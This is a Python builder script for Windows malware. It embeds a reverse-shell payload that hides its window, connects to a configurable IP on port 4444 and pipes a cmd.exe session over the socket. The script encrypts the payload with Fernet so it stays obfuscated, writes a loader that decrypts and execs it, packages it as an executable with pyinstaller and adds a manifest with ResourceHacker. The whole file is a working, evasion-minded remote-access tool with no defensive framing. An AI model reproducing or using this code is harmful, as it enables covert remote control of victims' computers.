from cryptography.fernet import Fernet
from os import system


payload = b'''
import os,sys,socket,subprocess,threading,win32gui,win32con,win32event,win32api,winerror

IP = "0.0.0.0" # Put IP here

frgrnd_wndw = win32gui.GetForegroundWindow();
wndw_title  = win32gui.GetWindowText(frgrnd_wndw);
win32gui.ShowWindow(frgrnd_wndw, win32con.SW_HIDE);

instance = win32event.CreateMutex(None, 1, 'NOSIGN')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    	instance = None
    	sys.exit()

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(bytes(data))
            
            
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((IP,4444))

p=subprocess.Popen(['\\windows\system32\\cmd.exe'], stderr=subprocess.STDOUT, stdout=subprocess.PIPE, stdin=subprocess.PIPE, bufsize=0)
 
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()


try:
    p.wait()
except KeyboardInterrupt:
    s.close()
'''
print("\n[+] Generating encoded payload")
print ("[+] Encrypting") 
key = Fernet.generate_key()
f = Fernet(key)
enc_pay = f.encrypt(bytes(payload))

f = open("shell.py", "w+")
f.write('import os,sys,socket,subprocess,threading,win32gui,win32con,win32event,win32api,winerror\nfrom cryptography.fernet import Fernet\nimport os\nimport sys\nkey = ' + str(key) + '\n' + 'f_obj = Fernet(key)' + '\n' + 'enc_pay = ' + str(enc_pay) + '\n' + 'exec(f_obj.decrypt(enc_pay))')
f.close()

print("[+] compiling")
system("pyinstaller -F shell.py 2>nul")
print ("[+]Adding manifest")
system("ResourceHacker.exe -open .\dist\shell.exe -resource manifest.res -action addskip -save .\dist\shell.exe")
print ("\n[+]Output generated at dist\shell.exe")
